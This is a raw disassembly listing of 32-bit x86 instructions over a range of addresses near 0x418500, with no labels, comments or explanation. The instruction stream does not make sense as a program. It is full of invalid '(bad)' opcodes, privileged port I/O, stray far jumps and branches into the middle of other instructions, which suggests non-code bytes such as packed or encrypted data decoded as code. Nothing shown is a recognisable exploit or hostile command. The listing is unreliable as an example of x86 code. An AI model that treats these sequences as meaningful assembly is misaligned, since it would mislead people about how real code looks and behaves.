  418473:	ins    BYTE PTR es:[edi],dx
  418474:	xor    dl,dl
  418476:	push   esp
  418477:	mov    ch,0xc2
  418479:	out    dx,eax
  41847a:	fcomp  DWORD PTR [edx+0x336b2577]
  418480:	ret    0x7122
  418483:	xor    BYTE PTR [eax],bl
  418485:	mov    ah,0x2b
  418487:	push   cs
  418488:	dec    edx
  418489:	pusha  
  41848a:	mov    DWORD PTR [eax-0x1a756e6b],edi
  418490:	dec    ebp
  418491:	enter  0x5214,0x75
  418495:	mov    ch,0xc7
  418497:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418498:	sbb    DWORD PTR [edi-0x2a],0xfffffff5
  41849c:	pop    ebp
  41849d:	mov    ch,BYTE PTR [edx]
  41849f:	pop    esp
  4184a0:	ss mov cl,0x37
  4184a3:	dec    ebp
  4184a4:	pop    es
  4184a5:	out    0x62,al
  4184a7:	jns    0x418439
  4184a9:	jbe    0x418456
  4184ab:	jo     0x418490
  4184ad:	xchg   BYTE PTR [eax],bh
  4184af:	rol    ah,cl
  4184b1:	out    dx,eax
  4184b2:	mov    bl,al
  4184b4:	xor    ch,BYTE PTR [esi-0x5b]
  4184b7:	xchg   ebx,eax
  4184b8:	or     DWORD PTR [esi-0x29],esi
  4184bb:	mov    cl,0xc7
  4184bd:	fld    TBYTE PTR [eax]
  4184bf:	inc    eax
  4184c0:	mov    dl,0xd2
  4184c2:	retf   
  4184c3:	mov    bl,0xb
  4184c5:	(bad)  
  4184c6:	loop   0x41850c
  4184c8:	mov    bh,0xa7
  4184ca:	mov    DWORD PTR [edx],esi
  4184cc:	push   ds
  4184cd:	cld    
  4184ce:	xchg   edi,eax
  4184cf:	(bad)
  4184d3:	push   ecx
  4184d4:	inc    edi
  4184d5:	int3   
  4184d6:	add    BYTE PTR [ecx+eax*8],al
  4184d9:	dec    ecx
  4184da:	into   
  4184db:	dec    esp
  4184dc:	cmp    al,0x38
  4184de:	addr16 jmp 0xe3aa:0x69ae80b
  4184e6:	or     eax,0x568761d
  4184eb:	stos   BYTE PTR es:[edi],al
  4184ec:	(bad)  [eax+0x3d4f9102]
  4184f2:	xchg   edi,eax
  4184f3:	(bad)  
  4184f4:	xchg   edi,eax
  4184f5:	jle    0x41855f
  4184f7:	sbb    al,0x68
  4184f9:	pop    ds
  4184fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4184fb:	mov    dl,0xc3
  4184fd:	js     0x41849a
  4184ff:	fs xor al,al
  418502:	mov    ecx,0x7b3d6e2b
  418507:	and    ah,BYTE PTR [edx]
  418509:	fwait
  41850a:	ror    BYTE PTR [esi+esi*2-0xa8fc767],cl
  418511:	dec    eax
  418512:	lock adc al,0x58
  418515:	xchg   esi,eax
  418516:	sahf   
  418517:	add    al,0x1e
  418519:	pop    esp
  41851a:	and    al,0xf4
  41851c:	push   0x38
  41851e:	js     0x41858f
  418520:	jbe    0x41851f
  418522:	out    0xe2,al
  418524:	imul   edi,esi,0xffffff84
  418527:	pop    ecx
  418528:	mov    al,0x12
  41852a:	pop    edx
  41852b:	test   al,0x29
  41852d:	mov    WORD PTR [esi+0x28],es
  418530:	inc    esi
  418531:	or     DWORD PTR [ecx],esi
  418533:	inc    edx
  418534:	shl    DWORD PTR [eax-0x4997d9bc],cl
  41853a:	and    bh,BYTE PTR [edi]
  41853c:	ds inc esp
  41853e:	pop    eax
  41853f:	xor    esp,DWORD PTR [ebx+0x53357d31]
  418545:	adc    edi,ebx
  418547:	repnz add DWORD PTR [esi+ebp*8-0x3c06b987],edx
  41854f:	mov    WORD PTR ds:0xfc6b2ceb,fs
  418555:	call   0x934e47b4
  41855a:	xchg   ebp,eax
  41855b:	ds (bad) 
  41855d:	aad    0x5f
  41855f:	sahf   
  418560:	test   al,0xb9
  418562:	rcr    BYTE PTR [ebx+0x1c],0xd
  418566:	push   eax
  418567:	dec    edi
  418568:	inc    esp
  418569:	push   edx
  41856a:	mov    ecx,eax
  41856c:	add    al,0x88
  41856e:	mov    cl,0x95
  418570:	xor    ecx,DWORD PTR [eax-0x71]
  418573:	int    0x4c
  418575:	and    ebx,ebp
  418577:	jge    0x418591
  418579:	shl    DWORD PTR [edx+0x78],cl
  41857c:	sub    BYTE PTR [ebp+0x17f3a440],0x31
  418583:	jne    0x418538
  418585:	fisubr DWORD PTR [esi]
  418587:	adc    eax,0x25a85d22
  41858c:	pop    ecx
  41858d:	jae    0x41854b
  41858f:	xor    eax,DWORD PTR [ecx-0x43]
  418592:	stos   BYTE PTR es:[edi],al
  418593:	loopne 0x418572
  418595:	cld    
  418596:	jecxz  0x418604
  418598:	ins    BYTE PTR es:[edi],dx
  418599:	stos   BYTE PTR es:[edi],al
  41859a:	pop    ebp
  41859b:	mov    cl,0x8a
  41859d:	pop    ecx
  41859e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41859f:	dec    ebp
  4185a0:	pop    esi
  4185a1:	jl     0x418554
  4185a3:	mov    esi,0x8e9c626
  4185a8:	mov    esi,0xd302eb8e
  4185ad:	push   cs
  4185ae:	adc    BYTE PTR [ecx+eax*4],ah
  4185b1:	push   edi
  4185b2:	imul   ecx,DWORD PTR [esi+0x7424524d],0x2f
  4185b9:	inc    ebx
  4185ba:	mov    bl,BYTE PTR ds:0x4867dbfc
  4185c0:	test   DWORD PTR [ecx-0x5b],edi
  4185c3:	aaa    
  4185c4:	push   ds
  4185c5:	fst    DWORD PTR [edx]
  4185c7:	mov    dh,0xfa
  4185c9:	push   ss
  4185ca:	pop    ebp
  4185cb:	pop    ebx
  4185cc:	nop
  4185cd:	ins    BYTE PTR es:[edi],dx
  4185ce:	loopne 0x4185a8
  4185d0:	lods   eax,DWORD PTR ds:[esi]
  4185d1:	cmp    al,0xa5
  4185d4:	adc    ecx,DWORD PTR [ebx]
  4185d6:	pop    esp
  4185d7:	mov    eax,ds:0x7235c595
  4185dc:	pop    eax
  4185dd:	mov    eax,ds:0x79a1e835
  4185e2:	pop    eax
  4185e3:	out    dx,eax
  4185e4:	push   0x55
  4185e6:	fst    DWORD PTR [ebp-0x106a7e11]
  4185ec:	rol    BYTE PTR ds:0x3d8d5a00,0x47
  4185f3:	aam    0x1c
  4185f5:	or     al,0xf3
  4185f7:	es pusha 
  4185f9:	repz dec esi
  4185fb:	lods   al,BYTE PTR ds:[esi]
  4185fc:	ror    DWORD PTR [ecx],0xce
  4185ff:	push   0xa300fb61
  418604:	sub    dl,BYTE PTR [ebx+edx*4-0x13c0b607]
  41860b:	mov    ch,0x90
  41860d:	outs   dx,DWORD PTR ds:[esi]
  41860e:	push   ds
  41860f:	jne    0x4185c8
  418611:	cmp    ah,ah
  418613:	rol    BYTE PTR [ebx+0x12414ca6],cl
  418619:	mov    bl,0x25
  41861b:	aas    
  41861c:	fs push 0x16264e81
  418622:	jae    0x418681
  418624:	mov    ds:0x109c3c1,al
  418629:	mov    bh,0x4c
  41862b:	mov    es,WORD PTR [eax-0x738c03ad]
  418631:	in     eax,dx
  418632:	xchg   BYTE PTR [ecx-0x4c34108d],bl
  418638:	push   eax
  418639:	push   esi
  41863a:	shr    DWORD PTR [ecx+0x1b],cl
  41863d:	mov    ecx,0xb13b1f4d
  418642:	mov    DWORD PTR [ecx+0x6d7d00ba],ebp
  418648:	sbb    eax,0x261ba309
  41864d:	fs mov ebp,0x750c054a
  418653:	in     al,dx
  418654:	mov    esp,ecx
  418656:	mov    esp,0x5c7a75b0
  41865b:	dec    esp
  41865c:	sbb    dl,BYTE PTR [ebp-0x6f]
  41865f:	xchg   edi,eax
  418660:	fcom   st(6)
  418662:	jp     0x418647
  418664:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418665:	fs data16 mov ch,0xa9
  418669:	(bad)  
  41866a:	sub    al,0x41
  41866c:	nop
  41866d:	lods   al,BYTE PTR ds:[esi]
  41866e:	or     al,0x62
  418670:	(bad)  
  418672:	arpl   bx,bx
  418674:	int    0xc4
  418676:	sub    cl,BYTE PTR [esi+eax*2]
  418679:	not    cl
  41867b:	data16 mov ch,0x69
  41867e:	loop   0x418688
  418680:	lds    ebx,FWORD PTR [esi]
  418682:	pop    esp
  418683:	aaa    
  418684:	pop    DWORD PTR cs:[ebx]
  418687:	jle    0x418651
  418689:	inc    edi
  41868a:	jne    0x4186c5
  41868c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41868d:	pusha  
  41868e:	arpl   WORD PTR [edi+0x18],bp
  418691:	xor    DWORD PTR [ecx+0x3995ddc],0x3c
  418698:	adc    eax,0x74c8bee8
  41869d:	dec    edx
  41869e:	dec    ebp
  41869f:	hlt    
  4186a0:	call   0x3703:0x12990890
  4186a7:	stos   BYTE PTR es:[edi],al
  4186a8:	add    bh,BYTE PTR [ecx-0x7aead9b7]
  4186ae:	out    dx,eax
  4186af:	jecxz  0x4186a9
  4186b1:	outs   dx,DWORD PTR ds:[esi]
  4186b2:	imul   edx,DWORD PTR [edx],0x294cad58
  4186b8:	jmp    0x16d7:0x818ebca9
  4186bf:	push   es
  4186c0:	hlt    
  4186c1:	(bad)  [eax]
  4186c3:	dec    esp
  4186c4:	jbe    0x418716
  4186c6:	jmp    0x73d3:0xd632b74e
  4186cd:	test   eax,0x1ad54735
  4186d2:	cmp    BYTE PTR [edi],ch
  4186d4:	push   ds
  4186d5:	cmp    ecx,DWORD PTR [esi+0x2ecac0fa]
  4186db:	push   ds
  4186dc:	cmc    
  4186dd:	sub    eax,0x8a7fc87c
  4186e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4186e3:	sbb    eax,0xc899f6b9
  4186e8:	cdq    
  4186e9:	jmp    0xcce7:0x326b7ed7
  4186f0:	jae    0x4186e0
  4186f2:	(bad)
  4186f5:	les    esi,FWORD PTR [eax+0x18]
  4186f8:	sub    BYTE PTR [eax],ch
  4186fa:	mov    ecx,0xe1311eac
  4186ff:	test   BYTE PTR [esi+0x682c98df],ch
  418705:	test   eax,0xd52e47e2
  41870a:	outs   dx,BYTE PTR ds:[esi]
  41870b:	fisub  WORD PTR [ecx]
  41870d:	into   
  41870e:	push   ds
  41870f:	mov    eax,ds:0xd6b1e922
  418714:	dec    ebp
  418715:	add    cl,al
  418717:	cdq    
  418718:	loop   0x418745
  41871a:	push   es
  41871b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41871c:	adc    edx,esi
  41871e:	clc    
  41871f:	scas   eax,DWORD PTR es:[edi]
  418720:	jmp    0xb3ee:0x353f51e2
  418727:	or     BYTE PTR [ebp+0x22b4389],bh
  41872d:	iret   
  41872e:	add    eax,0x4cc2cc90
  418733:	imul   edi
  418735:	jne    0x418770
  418737:	sbb    bh,BYTE PTR [esi+0x29b0a16b]
  41873d:	mov    eax,0x4fac89de
  418742:	dec    ebp
  418743:	inc    esp
  418744:	gs mov db2,edi
  418748:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418749:	mov    es,WORD PTR [esi+eax*4-0x3e]
  41874d:	outs   dx,BYTE PTR ds:[esi]
  41874e:	lods   al,BYTE PTR ds:[esi]
  41874f:	aad    0xa5
  418751:	push   edi
  418752:	push   0xdb8a4e38
  418757:	sar    DWORD PTR [eax+0x72f7276e],cl
  41875d:	in     al,0xfb
  41875f:	inc    eax
  418760:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418761:	mov    esi,0xf76da7db
  418766:	jmp    0x7e8fecf1
  41876b:	pop    ecx
  41876c:	xchg   BYTE PTR [esi],al
  41876e:	mov    cl,0x9d
  418770:	test   DWORD PTR ds:0x96ff3c46,ecx
  418776:	loopne 0x41873d
  418778:	in     al,0x6a
  41877a:	imul   ecx,edi,0xffffffb1
  41877d:	scas   eax,DWORD PTR es:[edi]
  41877e:	add    BYTE PTR [ebp+edi*1+0x1f535534],al
  418785:	imul   ebx,esi,0xc8175825
  41878b:	mov    esp,0x25340d94
  418790:	lock cli 
  418792:	(bad)  
  418793:	imul   BYTE PTR [ecx-0x5a]
  418796:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418797:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418798:	dec    ebx
  418799:	sub    BYTE PTR [edi],ch
  41879b:	jmp    0x418770
  41879d:	mov    ds:0xd040fb78,al
  4187a2:	add    DWORD PTR [eax+0x46efdcbd],esi
  4187a8:	xor    BYTE PTR [ebp+0x70765d9d],dh
  4187ae:	mov    esp,0x8cb92350
  4187b3:	push   esi
  4187b4:	cmp    DWORD PTR [ebp+0x7e],esi
  4187b7:	inc    eax
  4187b8:	add    BYTE PTR [edx+0x69],ah
  4187bb:	sbb    DWORD PTR [esi+edx*8+0x51bf6844],edx
  4187c2:	pusha  
  4187c3:	cmp    al,0x77
  4187c5:	std    
  4187c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4187c7:	sahf   
  4187c8:	add    DWORD PTR [ebx+0x22810032],ecx
  4187ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4187cf:	xor    ebx,edx
  4187d1:	mov    ch,0xab
  4187d3:	push   0xe00aa6e2
  4187d8:	cmp    ah,BYTE PTR [ecx]
  4187da:	pop    edx
  4187db:	dec    ebp
  4187dc:	sbb    al,0xf
  4187de:	ret    0x9c5c
  4187e1:	mov    ecx,es
  4187e3:	fsub   DWORD PTR [ecx+0x1b]
  4187e6:	leave  
  4187e7:	in     eax,0xb2
  4187e9:	dec    edx
  4187ea:	xchg   BYTE PTR [ecx],dl
  4187ec:	pushf  
  4187ed:	dec    esi
  4187ee:	js     0x418830
  4187f0:	lea    esi,[edx-0x7]
  4187f3:	mov    esi,0x91e3c62b
  4187f8:	jp     0x4187aa
  4187fa:	and    eax,0xe30a38d8
  4187ff:	cmc    
  418800:	call   0x498114b5
  418805:	shl    DWORD PTR ds:0xb0e7a2ac,1
  41880b:	icebp  
  41880c:	mov    al,0x9b
  41880e:	mov    eax,ds:0xd4366918
  418813:	fistp  DWORD PTR [ebx-0x26]
  418816:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418817:	inc    esp
  418818:	fbstp  TBYTE PTR [eax]
  41881a:	xchg   ebx,eax
  41881b:	xchg   ebp,eax
  41881c:	or     eax,DWORD PTR [edx-0x3c6ab09f]
  418822:	lds    eax,FWORD PTR [esi+0x284410b7]
  418828:	cmp    al,0xa1
  41882a:	in     eax,dx
  41882b:	cmc    
  41882c:	pop    esp
  41882d:	mov    eax,ds:0xed38a31c
  418832:	and    dl,ch
  418834:	add    al,0xd1
  418836:	pushf  
  418837:	jmp    DWORD PTR [esi+0x606bde6f]
  41883d:	ret    0x2a7d
  418840:	bound  edx,QWORD PTR [eax+ecx*1]
  418843:	in     eax,dx
  418844:	daa    
  418845:	inc    esi
  418846:	test   eax,0x73b80297
  41884b:	fcmovb st,st(5)
  41884d:	cli    
  41884e:	add    esi,esi
  418850:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418851:	push   ebp
  418852:	into   
  418853:	ins    BYTE PTR es:[edi],dx
  418854:	and    BYTE PTR [ecx],0x48
  418857:	and    BYTE PTR [ecx-0xd],bh
  41885a:	push   esi
  41885b:	inc    ecx
  41885c:	ja     0x41888d
  41885e:	(bad)  
  41885f:	dec    ebp
  418860:	xchg   esi,eax
  418861:	cmp    eax,0x59589f33
  418866:	pusha  
  418867:	inc    edi
  418868:	fdivp  st(3),st
  41886a:	jae    0x418836
  41886c:	cmp    ah,BYTE PTR [esi+0x63]
  41886f:	repz shl DWORD PTR [edx+0x5b3cf859],1
  418876:	repnz es aad 0x45
  41887a:	cwde   
  41887b:	fwait
  41887c:	in     al,dx
  41887d:	pop    esp
  41887e:	jns    0x418878
  418880:	retf   
  418881:	pop    eax
  418882:	and    al,0x63
  418884:	push   edi
  418885:	or     DWORD PTR [ebp-0x6b],eax
  418888:	jnp    0x418835
  41888a:	inc    ebx
  41888b:	mov    ah,0xa6
  41888d:	xchg   edi,eax
  41888e:	popa   
  41888f:	sbb    DWORD PTR [esi],esi
  418891:	not    bl
  418893:	mov    ecx,0x2b0b3511
  418898:	inc    ebx
  418899:	ret    
  41889a:	(bad)  
  41889b:	jno    0x4188cc
  41889d:	gs add eax,0x32e122c9
  4188a3:	mov    ebp,0xf2785a45
  4188a8:	xchg   DWORD PTR [esp+ebx*4+0x62],edi
  4188ac:	jg     0x418918
  4188ae:	stos   BYTE PTR es:[edi],al
  4188af:	push   ss
  4188b0:	pop    ds
  4188b1:	or     edi,DWORD PTR [esi-0x4b3e47fe]
  4188b7:	outs   dx,DWORD PTR ds:[esi]
  4188b8:	add    edi,DWORD PTR [edx+0x438940c6]
  4188be:	les    ebp,FWORD PTR [ebx+0x5186d1ac]
  4188c4:	pop    edx
  4188c5:	scas   al,BYTE PTR es:[edi]
  4188c6:	loopne 0x4188f0
  4188c8:	stos   DWORD PTR es:[edi],eax
  4188c9:	(bad)  
  4188ca:	js     0x418910
  4188cc:	not    esi
  4188ce:	in     eax,0x98
  4188d0:	xor    eax,0xd6e41304
  4188d5:	cmp    ah,BYTE PTR [edx]
  4188d7:	add    ebp,esi
  4188d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4188da:	mov    bh,0x90
  4188dc:	(bad)  
  4188de:	sub    ebp,DWORD PTR [ebp+0x15e7d469]
  4188e4:	and    eax,edx
  4188e6:	into   
  4188e7:	lods   al,BYTE PTR ds:[esi]
  4188e8:	xchg   esi,eax
  4188e9:	mov    cl,0x95
  4188eb:	push   es
  4188ec:	aad    0xd2
  4188ee:	int    0xa
  4188f0:	test   DWORD PTR [edi+ebx*8],esi
  4188f3:	stos   BYTE PTR es:[edi],al
  4188f4:	jo     0x418963
  4188f6:	fwait
  4188f7:	mov    ch,0xde
  4188f9:	adc    al,0xa3
  4188fb:	push   esp
  4188fc:	stos   BYTE PTR es:[edi],al
  4188fd:	or     DWORD PTR [ebx-0x7faeb172],ecx
  418903:	push   DWORD PTR [ecx-0x719bd43a]
  418909:	sbb    ecx,0x66
  41890c:	push   edx
  41890d:	ret    0x853c
  418910:	mov    ch,0x4a
  418912:	add    eax,0xb4339d29
  418917:	retf   0x7616
  41891a:	jno    0x418988
  41891c:	das    
  41891d:	ja     0x4188e6
  41891f:	push   0xcef04ee3
  418924:	mov    ds:0x713e9870,al
  418929:	mov    esp,ebp
  41892b:	xor    eax,0x5093071c
  418930:	ins    DWORD PTR es:[di],dx
  418932:	lods   al,BYTE PTR ds:[esi]
  418933:	dec    ecx
  418934:	mov    bh,0x3f
  418936:	aad    0xd7
  418938:	dec    esi
  418939:	jmp    0x4188bc
  41893b:	pop    edi
  41893c:	enter  0xd0fc,0xe9
  418940:	(bad)  
  418941:	mov    ecx,0x4ab4c6fb
  418946:	push   ecx
  418947:	(bad)  
  418949:	ds xchg edx,eax
  41894b:	dec    esp
  41894c:	stos   DWORD PTR es:[edi],eax
  41894d:	and    eax,0x44c62dcf
  418952:	inc    esp
  418953:	adc    al,0xc3
  418955:	and    ch,BYTE PTR [ecx-0x6f449aa1]
  41895b:	jle    0x418966
  41895d:	gs (bad) 
  41895f:	hlt    
  418960:	retf   0x93c7
  418963:	inc    ebp
  418964:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418965:	bsf    ebx,DWORD PTR cs:[edi+0x49]
  41896a:	sar    DWORD PTR [ebp-0x45],1
  41896d:	dec    ecx
  41896e:	cli    
  41896f:	cmc    
  418970:	push   edi
  418971:	imul   edx,DWORD PTR [edi+0x35],0x1d
  418975:	jnp    0x4189ea
  418977:	fiadd  WORD PTR [eax]
  418979:	inc    edx
  41897a:	mov    bl,0xd7
  41897c:	daa    
  41897d:	out    dx,eax
  41897e:	sbb    DWORD PTR [eax],ecx
  418980:	rcr    BYTE PTR [edi-0x28fd6246],0x6c
  418987:	nop
  418988:	inc    esi
  418989:	scas   eax,DWORD PTR es:[edi]
  41898a:	in     eax,0x45
  41898c:	push   esp
  41898d:	mov    al,0x55
  41898f:	inc    edi
  418990:	aaa    
  418991:	mov    DWORD PTR [esi+0x33e89683],edx
  418997:	mov    esi,0xa9f0e0bb
  41899c:	shl    BYTE PTR [esi-0x38fc7c0b],0xb2
  4189a3:	sbb    DWORD PTR ds:0x7ccf5348,edx
  4189a9:	mov    dh,BYTE PTR [ebx+ebx*1+0x6]
  4189ad:	in     eax,dx
  4189ae:	mov    al,0x9b
  4189b0:	out    0xfb,eax
  4189b2:	pop    ebp
  4189b3:	xor    ebx,ebx
  4189b5:	das    
  4189b6:	(bad)  
  4189b7:	mov    ds:0xfc59eaef,eax
  4189bc:	test   DWORD PTR [ebx],edi
  4189be:	into   
  4189bf:	mov    bh,0x3b
  4189c1:	mov    ds,ebp
  4189c3:	or     BYTE PTR [edi-0x24],bh
  4189c6:	jnp    0x418950
  4189c8:	dec    ebx
  4189c9:	or     ebx,ecx
  4189cb:	dec    ebp
  4189cc:	dec    eax
  4189cd:	loope  0x41896b
  4189cf:	cmp    ebx,DWORD PTR [eax]
  4189d1:	sti    
  4189d2:	iret   
  4189d3:	jp     0x41895e
  4189d5:	faddp  st(5),st
  4189d7:	xchg   ah,ah
  4189d9:	in     al,dx
  4189da:	test   eax,0xe7d64b90
  4189df:	neg    BYTE PTR [esi+0x7cd1bc0b]
  4189e5:	es jg  0x41897a
  4189e8:	rcl    BYTE PTR [esi+0x29],0xc3
  4189ec:	add    DWORD PTR [eax+0x3a],edx
  4189ef:	jb     0x4189da
  4189f1:	outs   dx,BYTE PTR ds:[esi]
  4189f2:	jno    0x4189fa
  4189f4:	les    eax,FWORD PTR [eax]
  4189f6:	popa   
  4189f7:	cmp    BYTE PTR [edx+ebp*1-0x22],bh
  4189fb:	aaa    
  4189fc:	and    BYTE PTR [esi-0x7268c644],bh
  418a02:	lods   eax,DWORD PTR ds:[esi]
  418a03:	mov    ebx,esi
  418a05:	dec    ebx
  418a06:	push   ecx
  418a07:	jnp    0x4189f9
  418a09:	hlt    
  418a0a:	mov    ds:0xfe1cec2d,al
  418a0f:	shr    DWORD PTR [eax],cl
  418a11:	and    edx,DWORD PTR es:[ebp-0x5e5efd29]
  418a18:	or     esi,DWORD PTR [ebx-0x57d97ec7]
  418a1e:	mov    eax,ds:0xd84942a8
  418a23:	add    al,0xec
  418a26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418a27:	nop
  418a28:	lods   eax,DWORD PTR ds:[esi]
  418a29:	sub    al,0x65
  418a2b:	sub    DWORD PTR [ebp-0x8],eax
  418a2e:	pop    ebp
  418a2f:	xor    dl,BYTE PTR [ecx+0x7a]
  418a32:	sub    ecx,esi
  418a34:	lock sub al,0xb9
  418a37:	pusha  
  418a38:	mov    cl,0xfe
  418a3a:	(bad)  
  418a3b:	sbb    DWORD PTR [esp+edi*8],ebp
  418a3e:	jmp    0x11c43c1b
  418a43:	mov    edi,0x8c92ec3a
  418a48:	dec    ebp
  418a49:	rcl    ch,cl
  418a4b:	data16 mov ?,WORD PTR [ebx+0x51eb406f]
  418a52:	xor    BYTE PTR [edx],al
  418a54:	les    ecx,FWORD PTR [eax]
  418a56:	xchg   esp,eax
  418a57:	call   0xe1f025ab
  418a5c:	dec    edx
  418a5d:	inc    esp
  418a5e:	jg     0x55087368
  418a64:	adc    cl,dl
  418a66:	jnp    0x4189ed
  418a68:	jbe    0x418a8a
  418a6a:	addr16 pop ecx
  418a6c:	sbb    ebx,DWORD PTR [edi-0x2ba4c026]
  418a72:	adc    eax,0xa082c042
  418a78:	dec    ecx
  418a79:	cmp    DWORD PTR [ebp+0x8],edx
  418a7c:	out    dx,al
  418a7d:	cmp    bl,BYTE PTR [edi+0x5b]
  418a80:	xlat   BYTE PTR ds:[ebx]
  418a81:	xchg   edi,eax
  418a82:	std    
  418a83:	mov    ch,0x4f
  418a85:	in     al,0x80
  418a87:	push   ecx
  418a88:	dec    esi
  418a89:	std    
  418a8a:	(bad)  
  418a8b:	adc    DWORD PTR [edi+0x5842f3d4],0xfd404993
  418a95:	outs   dx,DWORD PTR ds:[esi]
  418a96:	loopne 0x418a65
  418a98:	inc    edx
  418a99:	imul   BYTE PTR [eax+edx*2-0x1795045e]
  418aa0:	mov    dh,0x8a
  418aa2:	scas   al,BYTE PTR es:[edi]
  418aa3:	lods   al,BYTE PTR ds:[esi]
  418aa4:	test   DWORD PTR ds:0xfa8429d4,ebp
  418aaa:	(bad)  
  418aab:	mov    al,ds:0x89e153c8
  418ab0:	inc    edx
  418ab1:	addr16 cmp eax,0x56f5177b
  418ab7:	sbb    dh,0xfd
  418aba:	or     eax,0x2e3d6372
  418abf:	test   BYTE PTR [edx-0x48cb6c52],0x36
  418ac6:	and    al,0xbc
  418ac8:	and    bl,ch
  418aca:	fnsave [ecx-0x60]
  418acd:	sti    
  418ace:	imul   edi,DWORD PTR [ebp-0x71],0x21
  418ad2:	and    eax,0xeeabd182
  418ad7:	mov    dl,0x3a
  418ad9:	fdivr  DWORD PTR [edx]
  418adb:	ss pusha 
  418add:	add    eax,0x94f10129
  418ae2:	icebp  
  418ae3:	ins    BYTE PTR es:[edi],dx
  418ae4:	lahf   
  418ae5:	mov    DWORD PTR [esi],esp
  418ae7:	mov    ch,bh
  418ae9:	pop    es
  418aea:	cwde   
  418aeb:	push   ecx
  418aec:	or     eax,0x4f385b4
  418af1:	inc    edi
  418af2:	mov    al,0x71
  418af4:	into   
  418af5:	jns    0x418b5d
  418af7:	push   es
  418af8:	and    ch,BYTE PTR [esi]
  418afa:	xchg   DWORD PTR [edi-0x79],esp
  418afd:	jge    0x418aa5
  418aff:	in     eax,0x27
  418b01:	xchg   edi,eax
  418b02:	std    
  418b03:	xchg   esi,eax
  418b04:	stos   BYTE PTR es:[edi],al
  418b05:	dec    ebp
  418b06:	push   esp
  418b07:	or     esi,DWORD PTR [edi]
  418b09:	std    
  418b0a:	sbb    al,0x85
  418b0c:	xchg   edx,eax
  418b0d:	mov    eax,fs:0x5f06e044
  418b13:	mov    cl,0x8a
  418b15:	xchg   edi,eax
  418b16:	jmp    0x418ae6
  418b18:	rcr    BYTE PTR [esi-0x4b898e90],cl
  418b1e:	jg     0x418add
  418b20:	jmp    0x96c2:0xb8d77535
  418b27:	sbb    eax,0x1546b641
  418b2c:	inc    edi
  418b2d:	jno    0x418af5
  418b2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418b30:	or     al,0x43
  418b32:	js     0x418b71
  418b34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b35:	and    DWORD PTR [edx+0x17cfe454],ebx
  418b3b:	(bad)  [ecx]
  418b3d:	daa    
  418b3e:	stc    
  418b3f:	je     0x418b3b
  418b41:	std    
  418b42:	xchg   ecx,eax
  418b43:	jmp    DWORD PTR [edi+0xe]
  418b46:	nop
  418b47:	push   ebx
  418b48:	cmp    esp,DWORD PTR [eax-0x2f]
  418b4b:	fucomi st,st(0)
  418b4d:	cmp    BYTE PTR [eax-0x79],al
  418b50:	mov    ch,ah
  418b52:	das    
  418b53:	push   ds
  418b54:	rcr    BYTE PTR [edx+0x411015e2],1
  418b5a:	sbb    BYTE PTR [ebp-0x77b8bef5],0x26
  418b61:	cmp    esi,ebp
  418b63:	and    eax,0x32514b77
  418b68:	mov    ds:0x7e303307,eax
  418b6d:	iret   
  418b6e:	imul   edx,DWORD PTR [eax+0x6b],0xc4d8f224
  418b75:	jmp    0xb273dc76
  418b7a:	aas    
  418b7b:	nop
  418b7c:	ret    0xaaf8
  418b7f:	fisub  DWORD PTR [edi]
  418b81:	fdivr  st(4),st
  418b83:	xor    eax,DWORD PTR [esi-0x34]
  418b86:	clc    
  418b87:	movd   mm4,DWORD PTR [esi-0x1483d20b]
  418b8e:	jmp    0x418bcc
  418b90:	push   0xffffffad
  418b92:	mov    DWORD PTR [esi+esi*1+0x2f],0x95691e3f
  418b9a:	(bad)  
  418b9b:	push   esp
  418b9c:	cmp    eax,0xff65771a
  418ba1:	sub    al,0x3
  418ba3:	mov    dl,cl
  418ba5:	test   al,0x48
  418ba7:	popf   
  418ba8:	mov    ebx,0xc0d1a5
  418bad:	adc    DWORD PTR [ecx],edi
  418baf:	lahf   
  418bb0:	xlat   BYTE PTR ds:[ebx]
  418bb1:	sub    dh,BYTE PTR [edi+0x3454df25]
  418bb7:	xlat   BYTE PTR ds:[ebx]
  418bb8:	in     al,0xf5
  418bba:	stos   BYTE PTR es:[edi],al
  418bbb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418bbc:	jp     0x418bd0
  418bbe:	pop    edi
  418bbf:	xor    eax,0xdb42434a
  418bc4:	inc    ebp
  418bc5:	push   edx
  418bc6:	aas    
  418bc7:	jle    0x418b68
  418bc9:	add    ebp,edx
  418bcb:	fcom   QWORD PTR ds:[esi]
  418bce:	pop    eax
  418bcf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418bd0:	xor    DWORD PTR [ebx*1-0x3ecee2fd],ebp
  418bd7:	adc    BYTE PTR [ebx+0x19],dh
  418bda:	add    cl,bh
  418bdc:	inc    ebp
  418bdd:	or     al,0x6b
  418bdf:	pushf  
  418be0:	fneni(8087 only) 
  418be2:	jle    0x418be2
  418be4:	(bad)  
  418be6:	(bad)
  418beb:	dec    ebx
  418bec:	popf   
  418bed:	inc    esi
  418bee:	adc    ebp,DWORD PTR [ebx-0x43]
  418bf1:	pop    fs
  418bf3:	es dec ebx
  418bf5:	jnp    0x418b8a
  418bf7:	fmul   DWORD PTR [ebx+edi*1+0x76aca4b8]
  418bfe:	push   edx
  418bff:	outs   dx,BYTE PTR ds:[esi]
  418c00:	outs   dx,BYTE PTR ds:[esi]
  418c01:	ss mov dh,0x11
